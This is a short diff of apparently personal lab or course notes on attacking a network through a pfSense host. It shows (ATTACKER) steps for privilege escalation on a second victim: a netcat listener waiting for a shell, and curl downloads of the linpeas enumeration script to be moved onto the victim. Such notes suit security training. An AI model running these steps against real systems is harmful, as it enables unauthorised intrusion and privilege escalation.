@@ -48,7 +48,7 @@ he set up another listner over DEFAULT port (VIC 2 Persisitence)
 PRIV ESC ON VICTIM 2
 
 (ATTACKER) nc -lvp 55557 [NEW PORT I SET VIC ON PFSENSE]
-(ATTACKER) (NEW TERM) CAT INTERNAL AND CD TO 192.168.1.102
+(ATTACKER) (NEW TERM) cd INTERNAL AND cd TO 192.168.1.102
 (ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh [1:33][DAY 12]
 (ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee linpeas.sh
 (ATTACKER) ls [this is a automation script that we will move to the victim] this info could be found on hacktricks
